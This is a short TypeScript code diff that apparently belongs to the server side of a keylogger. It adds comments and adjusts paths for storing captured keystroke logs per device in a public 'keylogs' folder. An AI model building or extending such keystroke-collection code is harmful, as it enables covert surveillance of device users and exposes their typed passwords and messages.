@@ -249,10 +249,13 @@ const flushLogsToFileAsync = (filePath: string) => {
 };
 
 // Periodically flush logs
+
 setInterval(async () => {
 	if (logBuffer.length > 0) {
-		const logsDir = path.join(__dirname, "../../public/keylogs");
+		const logsDir = path.join(__dirname, "../../public/keylogs"); // Updated path to include keylogs
 		const today = new Date().toISOString().split("T")[0];
+
+		// Log file without deviceId
 		const filePath = path.join(logsDir, `${today}.txt`);
 
 		await flushLogsToFileAsync(filePath);
@@ -270,12 +273,14 @@ export const addNewKeyLogs = async (data: any) => {
 			};
 		}
 
+		// Updated path to include keylogs directory and deviceId
 		const logsDir = path.join(__dirname, "../../public/keylogs", deviceId);
 		if (!fs.existsSync(logsDir)) {
 			fs.mkdirSync(logsDir, { recursive: true });
 		}
 
 		const today = new Date().toISOString().split("T")[0];
+		// Log file inside the deviceId folder
 		const filePath = path.join(logsDir, `${today}.txt`);
 
 		const formattedDate = new Date()
@@ -286,6 +291,7 @@ export const addNewKeyLogs = async (data: any) => {
 
 		logBuffer.push(logEntry);
 
+		// Flush if buffer size reaches limit
 		if (logBuffer.length >= bufferSize) {
 			await flushLogsToFileAsync(filePath);
 		}
